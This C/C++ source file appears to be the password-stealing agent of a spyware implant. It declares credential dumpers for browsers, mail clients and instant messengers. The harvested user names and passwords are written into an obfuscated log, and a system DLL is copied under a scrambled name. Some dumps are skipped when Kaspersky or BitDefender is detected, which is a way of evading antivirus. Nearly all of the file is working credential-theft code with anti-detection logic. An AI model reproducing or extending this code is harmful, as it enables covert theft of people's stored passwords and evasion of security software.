
// modules declarations
extern int DumpFirefox(void);
extern int DumpChrome(void);
extern int DumpThunderbird(void);
extern int DumpIExplorer(void);
extern int DumpMSN(void);
extern int DumpOutlook(void);
extern int DumpPaltalk(void);
extern int DumpGtalk(void);
extern int DumpTrillian(void);
extern int DumpOpera(void);
extern void FireFoxInitFunc(void);
extern void FireFoxUnInitFunc(void);

//globals
HANDLE hfpwd;


int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass)
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;

	tolog.add(resource, (wcslen(resource)+1)*sizeof(WCHAR));
	tolog.add(user, (wcslen(user)+1)*sizeof(WCHAR));
	tolog.add(pass, (wcslen(pass)+1)*sizeof(WCHAR));
	tolog.add(service, (wcslen(service)+1)*sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));

	return (int)Log_WriteFile(hfpwd, tolog.get_buf(), tolog.get_len());
}

int LogPasswordA(CHAR *resource, CHAR *service, CHAR *user, CHAR *pass)
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;
	WCHAR buffer[512];

	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", resource);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", user);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", pass);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", service);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));

	return (int)Log_WriteFile(hfpwd, tolog.get_buf(), tolog.get_len());
}


BOOL CopyPStoreDLL(char *dll_path)
{
	char sys_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	char *dll_scramb_name;
	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return FALSE;
	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\", "pstorec.dll");
	
	if ( !(dll_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 2, TRUE)) )
		return FALSE;

	FNC(CopyFileA)(comp_path, HM_CompletePath(dll_scramb_name, dll_path), TRUE);
	SAFE_FREE(dll_scramb_name);
	return TRUE;
}


void DumpPasswords()
{
	hfpwd = Log_CreateFile(PM_PSTOREAGENT, NULL, 0);

	// Browsers
	DumpFirefox();
	DumpIExplorer();
	DumpOpera();
	DumpChrome();

	// Mail clients
	DumpThunderbird();

	// Kaspersky (con cui non mette piu' il driver) rompe i coglioni su questi
	if (!IsKaspersky() && !IsBitDefender()) {
		DumpOutlook();
		DumpMSN();
	}

	// Instant Messengers
	DumpPaltalk();
	DumpGtalk();
	DumpTrillian();

	Log_CloseFile(hfpwd);
}


DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Questo agente non ha stato started/stopped, ma quando
	// viene avviato esegue un'azione istantanea.
	if (bStartFlag) {
		FireFoxInitFunc();
		DumpPasswords();
	}

	return 1;
}


DWORD __stdcall PM_PStoreAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	PM_PStoreAgentStartStop(bStartFlag, TRUE);
	return 1;
}

DWORD __stdcall PM_PStoreAgentUnregister()
{
	FireFoxUnInitFunc();
	return 1;
}

void PM_PStoreAgentRegister()
{
	AM_MonitorRegister(PM_PSTOREAGENT, NULL, (BYTE *)PM_PStoreAgentStartStop, (BYTE *)PM_PStoreAgentInit, (BYTE *)PM_PStoreAgentUnregister);
	//PM_PStoreAgentInit(NULL, FALSE); Non serve :)
}